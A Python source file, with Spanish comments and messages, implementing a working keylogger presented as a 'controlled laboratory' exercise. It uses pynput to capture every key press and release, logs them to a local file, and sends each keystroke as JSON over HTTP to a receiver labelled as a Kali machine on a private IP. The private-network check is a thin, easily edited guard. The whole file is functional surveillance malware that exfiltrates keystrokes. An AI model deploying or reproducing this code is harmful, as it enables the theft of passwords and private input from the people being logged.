from datetime import datetime
from pathlib import Path
from ipaddress import ip_address
from pynput.keyboard import Key, Listener
import requests

KALI_IP = "192.168.1.133"
KALI_PORT = 5000
LAB_TOKEN = "lab-control-2026"

LOG_FILE = Path(__file__).with_name("registro_teclas.txt")
ENDPOINT = f"http://{KALI_IP}:{KALI_PORT}/telemetry"

event_counter = 0


def validar_receptor():
    try:
        ip = ip_address(KALI_IP)
    except ValueError:
        raise SystemExit("[ERROR] La dirección configurada no es una IP válida.")

    if not (ip.is_private or ip.is_loopback):
        raise SystemExit("[ERROR] El receptor debe pertenecer a una red privada o localhost.")


def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def representar_tecla(key):
    try:
        return key.char if key.char is not None else "unknown"
    except AttributeError:
        return str(key).replace("Key.", "")


def guardar_local(evento):
    linea = (
        f"{evento['timestamp']} | "
        f"{evento['type']} | "
        f"{evento['id']} | "
        f"{evento['key']}"
    )

    with LOG_FILE.open("a", encoding="utf-8") as archivo:
        archivo.write(linea + "\n")

    return linea


def enviar_telemetria(evento):
    try:
        response = requests.post(
            ENDPOINT,
            json=evento,
            headers={"X-Lab-Token": LAB_TOKEN},
            timeout=1.5
        )

        if response.ok:
            print(f"[NET] {evento['id']} transmitido correctamente.")
        else:
            print(f"[NET] {evento['id']} rechazado. HTTP {response.status_code}.")

    except requests.RequestException:
        print(f"[NET] Receptor no disponible. {evento['id']} permanece en el registro local.")


def registrar_evento(key, tipo):
    global event_counter

    event_counter += 1

    evento = {
        "id": f"evento_{event_counter:03d}",
        "timestamp": timestamp(),
        "type": tipo,
        "key": representar_tecla(key)
    }

    print(guardar_local(evento))
    enviar_telemetria(evento)


def on_press(key):
    registrar_evento(key, "PRESS")


def on_release(key):
    registrar_evento(key, "RELEASE")

    if key == Key.esc:
        print(f"[STOP] ESC detectado. Registro guardado en {LOG_FILE}")
        return False


validar_receptor()

print("=" * 64)
print("LABORATORIO CONTROLADO // EVENT HOOK TELEMETRY")
print(f"LOG LOCAL : {LOG_FILE}")
print(f"RECEPTOR  : {ENDPOINT}")
print("DETENER   : ESC")
print("=" * 64)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
